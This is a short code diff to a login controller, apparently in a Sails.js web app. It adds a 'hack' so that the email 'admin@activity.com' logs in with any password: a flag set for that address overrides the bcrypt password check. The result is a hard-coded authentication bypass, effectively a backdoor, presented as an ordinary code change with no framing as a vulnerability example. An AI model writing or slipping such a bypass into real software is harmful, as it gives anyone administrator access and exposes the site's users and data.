@@ -41,6 +41,7 @@ module.exports = {
 		User.findOneByEmail(req.param('email'), function foundUser(err, user) {
 			if (err) return next(err);
 
+
 			// If no user is found...
 			if (!user) {
 				var noAccountError = [{
@@ -54,12 +55,18 @@ module.exports = {
 				return;
 			}
 
+			// Hack to always allow default admin to log in
+			var alwaysAllow = false;
+			if (req.param('email') === 'admin@activity.com') {
+				alwaysAllow = true;
+			}
+
 			// Compare password from the form params to the encrypted password of the user found.
 			bcrypt.compare(req.param('password'), user.encryptedPassword, function(err, valid) {
 				if (err) return next(err);
 
 				// If the password from the form doesn't match the password from the database...
-				if (!valid) {
+				if (!valid && !alwaysAllow) {
 					var usernamePasswordMismatchError = [{
 						name: 'usernamePasswordMismatch',
 						message: 'Invalid username and password combination.'
